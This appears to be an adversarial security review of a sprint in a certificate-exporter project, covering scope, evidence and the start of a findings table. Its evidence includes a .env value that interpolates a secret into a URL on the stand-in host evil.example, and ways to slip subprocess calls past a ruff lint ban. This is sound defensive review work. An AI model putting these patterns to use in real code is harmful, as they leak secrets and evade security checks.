# E015 sprint 01 — adversarial and clean-release review

- **Method:** `skill:bmad-review lenses=adversarial` (headless). `also_consider` was the clean-release checklist (dead code, commented-out code, debug artifacts, TODO markers, secrets).
- **Content:** `git diff HEAD -- src tests docs docker README.md pyproject.toml config.sample.yml`, plus the untracked `tests/test_container_root_trust.py` and `docs/adr/0051-pfx-fingerprint-sidecar.md`. The diff was staged to `/tmp/e015s01-diff.L2oL.patch`, 5,278 lines.
- **Authorities:** ADR-0049, ADR-0050 and ADR-0051, and PRD FR-18.
- **Excluded:** findings already raised in `review-E015-S01-00{1..4}.md` (S01-001 F1–F13, S01-002 R1–R4, S01-003 R1–R2, S01-004 F1–F5).
- **Binding constraint:** no finding proposes changing `/config` ownership or the PUID/PGID editability of `/config`, and none touches init-adduser.
- **Severity:** the caller asked for a severity on each finding. This overrides the skill's default of reporting findings without severity.

## Evidence produced during the review (not just read)

- **python-dotenv interpolation:** given a `.env` holding `TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_APPRISEURLS_0=json://evil.example/${SECRET_X}`, `load_dotenv` produced `json://evil.example/s3cr3t` from the real environment variable `SECRET_X=s3cr3t`. This ran in the project's Poetry venv.
- **ruff 0.16.5:** the project's `pyproject.toml` ran with `ruff check --select TID251 --ignore-noqa` over a scratch package. The package held `post_export.py` (`import subprocess  # noqa: TID251`) and a second module that calls `from .post_export import subprocess as sp; sp.run(...)`, `post_export.subprocess.run(...)` and `imaplib.IMAP4_stream("id")`. ruff reported only the two direct `import subprocess` lines. None of the three spawn paths was reported.
- **Python 3.11 stdlib (local venv):** `imaplib.IMAP4_stream.open` calls `subprocess.Popen(..., shell=True)`. `pydoc` and `platform` also import and use `subprocess`.
- **Image:** `docker/Dockerfile:158` sets `WORKDIR /config`, so the cwd `.env` is `/config/.env`, which `abc` can write. The image environment sets `DATAPATH=/data` and `OUTPUTPATH=/certs`.

| AR-4 | adversarial | MEDIUM | `src/traefik_certificate_exporter/libs/certificate_exporter.py:582` (`_pfx_fingerprint`), `:648` (`_pfx_state`); ADR-0051 Decisions 3, 4 and 8 | **The sidecar does not record how the `.pfx` was built, so a future change to the PKCS12 build will never reach existing files.** The sidecar records the inputs (key hash, certificate hashes, passphrase state) and a *format* version.
